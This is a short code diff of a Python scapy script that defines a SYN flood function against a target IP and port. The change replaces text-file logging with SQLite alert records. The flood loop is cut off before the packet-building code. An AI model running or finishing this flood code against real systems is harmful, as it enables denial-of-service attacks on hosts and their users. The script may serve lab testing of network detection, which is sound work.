@@ -1,17 +1,22 @@
 from scapy.all import IP, TCP, send
-import os
 import time
+import sqlite3
 
-# Ensure the 'logs' directory exists
-os.makedirs("logs", exist_ok=True)
+DB_NAME = "network_logs.db"
 
-# Function to log events to a file and print to console
+def insert_alert(timestamp, alert_type, message):
+    conn = sqlite3.connect(DB_NAME)
+    c = conn.cursor()
+    c.execute("INSERT INTO alerts (timestamp, type, message) VALUES (?, ?, ?)",
+              (timestamp, alert_type, message))
+    conn.commit()
+    conn.close()
+
 def log_event(message):
-    with open("logs/syn_flood_log.txt", "a") as log_file:
-        log_file.write(f"{message}\n")
+    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+    insert_alert(timestamp, "SYN_FLOOD", message)
     print(message)
 
-# Function to perform a SYN flood attack
 def syn_flood(target_ip, target_port, packet_count=100):
     log_event(f"Starting SYN flood on {target_ip}:{target_port} at {time.strftime('%Y-%m-%d %H:%M:%S')}...")
     for i in range(packet_count):
